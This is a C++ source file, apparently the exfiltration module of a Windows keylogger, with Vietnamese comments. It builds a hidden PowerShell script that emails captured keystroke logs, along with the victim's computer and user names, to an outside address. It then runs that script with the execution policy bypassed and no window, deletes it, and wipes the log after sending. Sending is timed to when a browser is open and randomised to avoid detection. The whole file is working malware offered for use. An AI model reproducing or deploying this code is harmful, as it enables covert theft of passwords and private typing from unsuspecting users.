#include "../exfiltration.h"
#include "../utils.h"
#include "../encryption.h"

bool SendEmail(const std::string& logData) {
    // Sử dụng PowerShell để gửi email với SSL/TLS
    std::string encodedContent = base64_encode(logData);

    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    char userName[256] = { 0 };
    DWORD userSize = sizeof(userName);
    GetUserNameA(userName, &userSize);

    time_t now = time(NULL);
    struct tm time = { };
    char timeBuffer[64] = { 0 };
    localtime_s(&time, &now);
    strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", &time);

    // Tạo file PowerShell script tạm thời
    std::string psScriptPath = GetSecurePath("mail_temp.ps1");
    std::ofstream psScript(psScriptPath);

    if (psScript.is_open()) {
        psScript << "$SMTPServer = '" << SMTP_SERVER << "'" << std::endl;
        psScript << "$SMTPPort = " << SMTP_PORT << std::endl;
        psScript << "$Username = '" << SENDER_EMAIL << "'" << std::endl;
        psScript << "$Password = '" << SENDER_PASSWORD << "'" << std::endl;
        psScript << "$to = '" << RECEIVER_EMAIL << "'" << std::endl;
        psScript << "$subject = 'Keylogger Report - " << computerName << " - " << timeBuffer << "'" << std::endl;
        psScript << "$body = @\"" << std::endl;
        psScript << "===== KEYLOGGER REPORT =====" << std::endl;
        psScript << "Computer: " << computerName << std::endl;
        psScript << "User: " << userName << std::endl;
        psScript << "Time: " << timeBuffer << std::endl;
        psScript << "==============================" << std::endl << std::endl;
        psScript << "$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" << encodedContent << "')))" << std::endl;
        psScript << "\"@" << std::endl;
        psScript << "$securePassword = ConvertTo-SecureString $Password -AsPlainText -Force" << std::endl;
        psScript << "$credential = New-Object System.Management.Automation.PSCredential $Username, $securePassword" << std::endl;
        psScript << "Send-MailMessage -From $Username -to $to -Subject $subject -Body $body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $credential" << std::endl;

        psScript.close();

        // Thực thi PowerShell với quyền ẩn
        std::string psCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + psScriptPath + "\"";
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, (LPSTR)psCommand.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            // Đợi cho process hoàn thành
            WaitForSingleObject(pi.hProcess, 30000); // Timeout 30 giây

            DWORD exitCode = 0;
            GetExitCodeProcess(pi.hProcess, &exitCode);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            // Xóa script tạm thời
            DeleteFileA(psScriptPath.c_str());

            return (exitCode == 0);
        }

        // Xóa script tạm thời
        DeleteFileA(psScriptPath.c_str());
    }

    return false;
}

void EmailExfiltrationJob() {
    srand(static_cast<unsigned int>(time(NULL)));

    while (true) {
        // Thêm jitter (thay đổi ngẫu nhiên) để tránh phát hiện
        int jitterSeconds = rand() % 2;
        int sleepInterval = SEND_INTERVAL + jitterSeconds;

        std::this_thread::sleep_for(std::chrono::seconds(sleepInterval));

        // Kiểm tra xem người dùng có đang duyệt web không
        HWND browserWindow = FindWindowA("Chrome_WidgetWin_1", NULL);
        if (browserWindow == NULL) {
            browserWindow = FindWindowA("MozillaWindowClass", NULL);
        }
        if (browserWindow == NULL) {
            browserWindow = FindWindowA("IEFrame", NULL); // Internet Explorer
        }
        if (browserWindow == NULL) {
            browserWindow = FindWindowA("ApplicationFrameWindow", NULL); // Microsoft Edge
        }

        bool userBrowsing = (browserWindow != NULL && IsWindowVisible(browserWindow));
        if (!userBrowsing) {
            std::this_thread::sleep_for(std::chrono::minutes(5));
            continue;
        }

        // Kiểm tra kết nối internet
        if (!IsConnectedToInternet()) {
            continue;
        }

        // Đọc file log
        std::ifstream file(logFile.c_str(), std::ios::binary);
        if (!file.is_open() || file.peek() == std::ifstream::traits_type::eof()) {
            if (file.is_open()) file.close();
            continue;
        }

        std::string encryptedContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        // Giải mã nội dung
        std::string logContent = AdvancedDecrypt(encryptedContent);

        // Nếu gửi thành công, xóa nội dung file log
        if (SendEmail(logContent)) {
            std::ofstream newFile(logFile.c_str(), std::ios::binary);
            if (newFile.is_open()) {
                // Ghi thời gian mới
                LogTime();
                newFile.close();
            }
        }
    }
}